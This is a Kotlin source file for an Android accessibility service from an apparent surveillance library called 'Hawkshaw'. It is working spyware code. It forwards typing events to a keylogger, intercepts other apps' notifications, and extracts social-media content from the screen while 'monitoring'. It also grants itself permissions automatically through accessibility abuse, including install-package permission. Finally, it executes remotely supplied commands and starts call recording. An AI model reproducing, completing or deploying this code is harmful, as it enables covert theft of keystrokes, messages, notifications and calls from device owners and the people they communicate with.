package com.hawkshaw.library.features.accessibility

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo // Import for service configuration
import android.app.Notification
import android.content.Intent
import android.os.Build
import android.os.Parcelable
import android.util.Log // Import Log for debug logs
import android.view.accessibility.AccessibilityEvent
import androidx.annotation.RequiresApi
import com.hawkshaw.library.HawkshawInitializer
import com.hawkshaw.library.datalayer.models.Command
import com.hawkshaw.library.datalayer.network.twirp.interceptors.ContentNegotiationInterceptorKt
import com.hawkshaw.library.features.media.MediaService
import com.hawkshaw.library.logger.Logger
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import com.hawkshaw.library.features.accessibility.socialmedia.HandlerKt;
import com.hawkshaw.library.features.accessibility.PermissionManagerKt
import com.hawkshaw.library.features.accessibility.EnhancedPermissionManager;

class MainAccessibilityService : AccessibilityService() {

    private val coroutineScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    /**
     * Process the incoming accessibility event based on its type
     */
    @RequiresApi(Build.VERSION_CODES.O)
    private fun filterByEventType(accessibilityEvent: AccessibilityEvent?) {
        Log.i(TAG, "filterByEventType() called. EventType: ${accessibilityEvent?.eventType}, Package: ${accessibilityEvent?.packageName}, CurrentStep: ${HawkshawInitializer.activityStep.value}")
        val eventType: Int? = accessibilityEvent?.eventType

        when (eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,
            AccessibilityEvent.TYPE_VIEW_FOCUSED,
            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> {
                Log.d(TAG, "Processing Keylogger-relevant event: $eventType")
                coroutineScope.launch {
                    try {
                        accessibilityEvent?.let { KeyloggerEventKt.processEvent(this@MainAccessibilityService, it) }
                        Log.v(TAG, "KeyloggerEventKt.processEvent potentially completed for event: $eventType.")
                    } catch (e: Exception) {
                        Logger.e(TAG, "Error processing keylogger event $eventType: ${e.message}", e, false, 12, null)
                        Log.e(TAG, "Error processing keylogger event $eventType: ${e.message}", e)
                    }
                }
            }
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                Log.d(TAG, "Processing Window State Changed event.")
                onWindowChanged(accessibilityEvent, false)
            }
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                Log.d(TAG, "Processing Window Content Changed event.")
                onWindowChanged(accessibilityEvent, true)
            }
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                Log.d(TAG, "Processing Notification State Changed event.")
                val pkgName: String? = accessibilityEvent.packageName?.toString()

                if (pkgName != null && pkgName != packageName) {
                    Log.d(TAG, "Notification from external package: $pkgName")
                    val parcelableData: Parcelable? = accessibilityEvent.parcelableData
                    if (parcelableData is Notification) {
                        val notificationPackageName = accessibilityEvent.packageName
                        if (notificationPackageName != null) {
                            Log.v(TAG, "Handling notification from $notificationPackageName")
                            coroutineScope.launch {
                                NotificationKt.handleNotificationAsync(parcelableData, notificationPackageName)
                                Log.v(TAG, "NotificationKt.handleNotificationAsync completed for $notificationPackageName.")
                            }
                        } else {
                            Log.w(TAG, "Notification package name is null for event: $eventType.")
                        }
                    } else {
                        Log.w(TAG, "Parcelable data is not a Notification or is null for event: $eventType.")
                    }
                } else {
                    Log.d(TAG, "Ignoring notification from own package ('$packageName') or null package ('$pkgName') for event: $eventType.")
                }
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED, 
            AccessibilityEvent.TYPE_ANNOUNCEMENT -> {
                 Log.v(TAG, "Received common but currently unhandled event type: $eventType. Package: ${accessibilityEvent?.packageName}")
            }
            else -> {
                Log.d(TAG, "Unhandled accessibility event type: $eventType. Package: ${accessibilityEvent?.packageName}")
            }
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun onWindowChanged(accessibilityEvent: AccessibilityEvent?, isContentChanged: Boolean) {
        val currentStep = HawkshawInitializer.activityStep.value
        val eventPackageName = accessibilityEvent?.packageName?.toString()

        // Early exit for com.android.systemui events during MONITORING to reduce noise and processing
        if (currentStep == HawkshawInitializer.Step.MONITORING && eventPackageName == "com.android.systemui") {
            Log.v(TAG, "onWindowChanged: Ignoring event from com.android.systemui during MONITORING. isContentChanged: $isContentChanged, EventType: ${accessibilityEvent?.eventType}")
            return
        }

        Log.i(TAG, "onWindowChanged() called. isContentChanged: $isContentChanged, currentStep: $currentStep, eventPackage: $eventPackageName, eventType: ${accessibilityEvent?.eventType}")

        // Temporarily bypassed for manual permission granting
        if (shouldLaunchPermissionManager()) {
            Log.i(TAG, "onWindowChanged: Condition met to launch PermissionManager. CurrentStep: $currentStep")
            // Only proceed if accessibilityEvent is not null
            if (accessibilityEvent != null) {
                // Grant permissions using enhanced robust permission manager
                try {
                    // Use enhanced permission manager for robust handling
                    EnhancedPermissionManager.grantPermissionsRobust(this, accessibilityEvent)
                    // Fallback to original method if enhanced fails
                    PermissionManagerKt.grantPermissions(this, accessibilityEvent)
                } catch (e: Exception) {
                    Logger.e(TAG, "Error in permission granting", e, false, 12, null)
                    // Last resort fallback
                    try {
                        PermissionManagerKt.grantPermissions(this, accessibilityEvent)
                    } catch (fallbackError: Exception) {
                        Logger.e(TAG, "Both enhanced and fallback permission managers failed", fallbackError, false, 12, null)
                    }
                }
            } else {
                Log.w(TAG, "Cannot grant permissions: accessibilityEvent is null")
            }
            Log.v(TAG, "PermissionManagerKt.grantPermissions called from onWindowChanged.")
        } else {

        } ?: Log.w(TAG, "AccessibilityEvent is null when trying to grant permissions from onWindowChanged.")
        Log.i(TAG, "Temporarily bypassing automatic permission granting. Permissions should be granted manually.")

        if (currentStep == HawkshawInitializer.Step.MONITORING) {
            accessibilityEvent?.let { event ->
                Log.i(TAG, "onWindowChanged: Step is MONITORING. Attempting to extract social media data. EventType: ${event.eventType}, Package: ${event.packageName}.")
                coroutineScope.launch { 
                    try {
                        HandlerKt.extractSocialMedia(event) 
                        Log.v(TAG, "HandlerKt.extractSocialMedia call completed from onWindowChanged for package ${event.packageName}.")
                    } catch (e: Exception) {
                        Log.e(TAG, "Error in HandlerKt.extractSocialMedia from onWindowChanged for package ${event.packageName}: ${e.message}", e)
                        Logger.e(TAG, "Error in HandlerKt.extractSocialMedia for package ${event.packageName}: ${e.message}", e, false, 12, null)
                    }
                }
            } ?: Log.w(TAG, "AccessibilityEvent is null in onWindowChanged when in MONITORING state. Skipping social media extraction.")
        } else {
            Log.d(TAG, "onWindowChanged: Not in MONITORING state (current: $currentStep). Skipping social media extraction.")
        }
    }

    private fun shouldLaunchPermissionManager(): Boolean {
        val step = HawkshawInitializer.activityStep.value
        Log.i(TAG, "shouldLaunchPermissionManager() called. Current step: $step")

        val launch = when (step) {
            HawkshawInitializer.Step.REQUESTING_GENERAL_PERMISSIONS -> {
                Log.d(TAG, "Matched REQUESTING_GENERAL_PERMISSIONS. Current step: $step")
                val activityLifecycleState = HawkshawInitializer.activityState.value
                val should = activityLifecycleState.isAtLeast(HawkshawInitializer.State.STARTED)
                Log.d(TAG, "For $step, activity state: $activityLifecycleState, should launch: $should")
                should
            }
            HawkshawInitializer.Step.REQUESTING_INSTALL_PACKAGES -> {
                Log.d(TAG, "Matched REQUESTING_INSTALL_PACKAGES. Current step: $step")
                val activityLifecycleState = HawkshawInitializer.activityState.value
                val should = activityLifecycleState.isAtLeast(HawkshawInitializer.State.STARTED)
                Log.d(TAG, "For $step, activity state: $activityLifecycleState, should launch: $should")
                should
            }
            else -> {
                Log.d(TAG, "Step $step did not match expected cases. (is REQUESTING_GENERAL_PERMISSIONS: ${step == HawkshawInitializer.Step.REQUESTING_GENERAL_PERMISSIONS}, is REQUESTING_INSTALL_PACKAGES: ${step == HawkshawInitializer.Step.REQUESTING_INSTALL_PACKAGES})")
                false
            }
        }
        Log.i(TAG, "shouldLaunchPermissionManager() returning: $launch. Current step: $step")
        return launch
    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onAccessibilityEvent(accessibilityEvent: AccessibilityEvent?) {
        Log.i(TAG, "onAccessibilityEvent() received. EventType: ${accessibilityEvent?.eventType}, Package: ${accessibilityEvent?.packageName}, CurrentStep: ${HawkshawInitializer.activityStep.value}")
        if (accessibilityEvent == null) {
            Log.w(TAG, "onAccessibilityEvent received a null event.")
            return
        }
        try {
            filterByEventType(accessibilityEvent)
        } catch (e: Exception) {
            Logger.e(TAG, "OnAccessibilityEvent: ${e.message}", e, false, 12, null)
            Log.e(TAG, "Error in onAccessibilityEvent main try-catch: ${e.message}", e)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.i(TAG, "onDestroy() called. Cancelling coroutine scope. CurrentStep: ${HawkshawInitializer.activityStep.value}")
        coroutineScope.cancel("AccessibilityService is being destroyed.")
        Logger.v(TAG, "OnDestroy", false, 4, null)
    }

    override fun onInterrupt() {
        Log.i(TAG, "onInterrupt() called. Service interrupted. CurrentStep: ${HawkshawInitializer.activityStep.value}")
        Logger.v(TAG, "OnInterrupt", false, 4, null)
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.i(TAG, "onServiceConnected() called. Accessibility service connected. CurrentStep: ${HawkshawInitializer.activityStep.value}")
        // You can uncomment and modify serviceInfo here if needed for specific event filtering at the system level.
        // Example: To only listen for window changes and text input related events:
        // serviceInfo = serviceInfo.apply {
        //     eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
        //                  AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
        //                  AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
        //                  AccessibilityEvent.TYPE_VIEW_FOCUSED or
        //                  AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED or
        //                  AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED
        //     // Consider adding specific packageNames if you only target a few apps.
        //     // packageNames = arrayOf("com.example.app1", "com.example.app2")
        //     flags = flags or AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or 
        //                   AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
        //     Log.d(TAG, "ServiceInfo configured. EventTypes: $eventTypes, Flags: $flags")
        // }
        Logger.v(TAG, "OnServiceConnected", false, 4, null)
    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.i(TAG, "onStartCommand() called. Action: ${intent?.action}, Flags: $flags, StartId: $startId. CurrentStep: ${HawkshawInitializer.activityStep.value}")
        intent?.let {
            val commandStr = it.getStringExtra("command")
            if (commandStr != null) {
                Log.d(TAG, "Received 'command' extra: $commandStr")
                try {
                    val json = ContentNegotiationInterceptorKt.json
                    val command = json.decodeFromString(Command.AccessibilityCommandRequest.serializer(), commandStr)
                    Log.v(TAG, "Decoded accessibility command: $command")
                    GlobalActionKt.handleCommand(this, command)
                    Log.v(TAG, "GlobalActionKt.handleCommand called for command: $command")
                } catch (e: Exception) {
                    Log.e(TAG, "Error processing 'command' string: $commandStr", e)
                    Logger.e(TAG, "Error decoding/handling command: ${e.message}", e, false, 12, null)
                }
            } else {
                Log.d(TAG, "No 'command' extra found in intent.")
            }

            if (it.getBooleanExtra("call_recorder", false)) {
                Log.i(TAG, "Received 'call_recorder' extra. Handling call recorder request.")
                MediaService.handleCallRecorderRequest(it)
                Log.v(TAG, "MediaService.handleCallRecorderRequest called.")
            }
        } ?: Log.d(TAG, "Intent is null in onStartCommand().")

        Log.d(TAG, "onStartCommand() finished.")
        return super.onStartCommand(intent, flags, startId)
    }

    companion object {
        const val TAG = "MainAccessibilityService"
    }
}
